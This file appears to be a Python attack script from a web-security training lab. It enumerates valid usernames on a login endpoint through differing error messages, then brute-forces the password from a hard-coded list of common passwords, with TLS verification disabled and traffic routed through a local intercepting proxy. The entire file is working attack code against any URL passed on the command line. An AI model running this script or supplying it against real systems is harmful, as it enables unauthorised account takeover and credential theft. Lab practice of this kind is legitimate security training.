import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

user_list = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
    "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user",
    "vagrant", "azureuser", "academico", "acceso", "access", "accounting",
    "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin",
    "administracion", "administrador", "administrator", "administrators",
    "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates",
    "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai",
    "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind",
    "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce",
    "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
    "app01", "app1", "apple", "application", "applications", "apps",
    "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona",
    "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena",
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto",
    "autodiscover"
]

password_list = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",
    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",
    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow"
]


def get_login_cred(url):
    for user in user_list:
        params = f'username={user}&password=test'
        r = requests.post(url + '/login', data=params,
                          verify=False, proxies=proxies)
        if 'Invalid username' not in r.text:
            print(f'Valid username is: {user}')
            return user


def brute_force_password(url):
    user = get_login_cred(url)
    for password in password_list:
        params = f'username={user}&password={password}'
        r = requests.post(url + '/login', data=params,
                          verify=False, proxies=proxies)
        if 'Incorrect password' not in r.text:
            print(f'Valid password is: {password}')


def main():
    if len(sys.argv) != 2:
        print('add url: example.com')
        sys.exit(-1)

    url = sys.argv[1]
    print('cracking password...')
    brute_force_password(url)


if __name__ == '__main__':
    main()
